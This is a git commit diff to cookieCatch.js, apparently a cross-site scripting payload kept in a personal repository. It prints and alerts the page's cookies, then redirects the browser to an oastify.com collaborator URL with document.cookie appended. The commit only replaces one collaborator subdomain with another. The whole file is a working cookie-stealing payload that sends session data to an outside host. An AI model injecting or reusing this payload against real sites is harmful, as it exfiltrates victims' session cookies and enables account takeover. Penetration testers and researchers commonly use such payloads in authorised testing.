57ba315bdf1f7d6200f93b5b75bf3e8aeca7ea86
brunovetecao <135657639+brunovetecao@users.noreply.github.com>
2023-08-10 20:58:59 +0800

    Update cookieCatch.js

--- cookieCatch.js
+++ cookieCatch.js
@@ -1,3 +1,3 @@
 document.write (document.cookie);
 alert (document.cookie);
-document.location= "https://1uwdd1g0i4i5lvjkyaysy8km2d84wukj.oastify.com/cookie_catcher.php?c=" + document.cookie;
+document.location= "https://6qx8of1dwz4i6z2jal89nk7b92ft3jr8.oastify.com/cookie_catcher.php?c=" + document.cookie;
